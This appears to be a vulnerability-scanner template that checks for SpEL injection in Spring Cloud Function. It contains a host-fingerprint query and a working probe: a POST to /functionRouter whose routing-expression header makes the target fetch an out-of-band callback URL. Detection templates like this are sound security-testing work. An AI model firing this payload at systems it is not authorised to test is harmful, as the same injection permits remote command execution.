name: Spring_Cloud_Function_SPEL_Vulnerability
transport: http
detail:
  dock: '((header="Server: Netty@SpringBoot" || (body="Whitelabel Error Page" && body="There
    was an unexpected error")) && body!="couchdb") || title="SpringBootAdmin-Server"
    || body="SpringBoot"'
  product: Spring Cloud Function
  homepage: https://github.com/spring-cloud/spring-cloud-function
  impact: '<p><span style="color: rgb(0, 0, 0); font-size: 16px;">The vulnerability
    can cause remote command execution by injecting spel expressions.</span><br></p>'
  description: <p>Spring cloud function is a function calculation framework based
    on spring boot. By abstracting the transmission details and infrastructure, it
    retains familiar development tools and development processes for developers, so
    that developers can focus on realizing business logic, so as to improve development
    efficiency.</p><p>There is spring in the HTTP request header for accessing spring
    cloud function&nbsp;cloud.&nbsp;function.&nbsp;Routing expression parameter, whose
    spel expression can be injected and executed through StandardeValuationContext
    parsing.&nbsp;Eventually, an attacker can perform remote command execution through
    this vulnerability.</p>
set:
  reverse: newReverse()
  reverseUrl: reverse.url
rules:
  r1:
    method: POST
    url: /functionRouter
    follow_redirects: false
    headers:
      spring.cloud.function.routing-expression: new java.net.URL("{{reverseUrl}}").getContent()
    expression: reverse.wait(5)
expression: r1()
